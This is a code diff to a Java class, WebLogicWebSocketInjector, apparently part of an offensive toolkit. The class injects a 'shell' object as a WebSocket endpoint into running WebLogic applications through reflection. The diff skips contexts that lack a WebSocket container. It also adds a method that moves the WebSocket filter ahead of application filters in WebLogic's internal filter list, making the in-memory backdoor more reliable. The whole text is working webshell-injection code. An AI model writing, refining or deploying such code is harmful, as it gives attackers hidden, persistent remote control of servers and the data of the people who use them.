@@ -9,6 +9,7 @@ import java.lang.management.ManagementFactory;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
+import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
@@ -48,9 +49,13 @@ public class WebLogicWebSocketInjector {
         } else {
             for (Object context : contexts) {
                 try {
+                    Object container = getServerContainer(context);
+                    if (container == null) {
+                        continue;
+                    }
                     msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
-                    inject(context, shell);
+                    inject(context, container, shell);
                     msg += "[" + getUrlPattern() + "] ready\n";
                 } catch (Throwable e) {
                     msg += "failed " + getErrorMessage(e) + "\n";
@@ -139,16 +144,17 @@ public class WebLogicWebSocketInjector {
     }
 
     @SuppressWarnings("all")
-    private void inject(Object context, Object obj) throws Exception {
+    private Object getServerContainer(Object context) throws Exception {
         // WebLogic's WebAppServletContext implements javax.servlet.ServletContext directly
         Object container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
         if (container == null) {
             container = invokeMethod(context, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
         }
-        if (container == null) {
-            throw new RuntimeException("container is null");
-        }
+        return container;
+    }
 
+    @SuppressWarnings("all")
+    private void inject(Object context, Object container, Object obj) throws Exception {
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         Class<?> serverEndpointConfigClass;
         Class<?> builderClass;
@@ -172,6 +178,40 @@ public class WebLogicWebSocketInjector {
             invokeMethod(container, "register", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
         } catch (Exception e) {
             invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
+        }
+        try {
+            prioritizeWebSocketFilter(context);
+        } catch (Exception ignored) {
+            // Newer WebLogic versions may use different filter internals and already order Tyrus first.
+        }
+    }
+
+    /**
+     * WebLogic 12 and 14 append Tyrus's filter after application filters. If one of those filters
+     * does not support async processing, Tyrus cannot call startAsync() during the WebSocket
+     * handshake. Move only the WebSocket mapping ahead of normal application mappings so the
+     * upgrade is handled before a non-async filter can disable async support for the request.
+     */
+    @SuppressWarnings("all")
+    private void prioritizeWebSocketFilter(Object context) throws Exception {
+        Object filterManager = invokeMethod(context, "getFilterManager", null, null);
+        Object value = getFieldValue(filterManager, "filterPatternList");
+        if (!(value instanceof List)) {
+            return;
+        }
+        List filterMappings = (List) value;
+        synchronized (filterMappings) {
+            for (int i = 0; i < filterMappings.size(); i++) {
+                Object filterMapping = filterMappings.get(i);
+                Object filterName = getFieldValue(filterMapping, "filterName");
+                if ("WebSocket filter".equals(filterName)) {
+                    if (i > 0) {
+                        filterMappings.remove(i);
+                        filterMappings.add(0, filterMapping);
+                    }
+                    return;
+                }
+            }
         }
     }
 
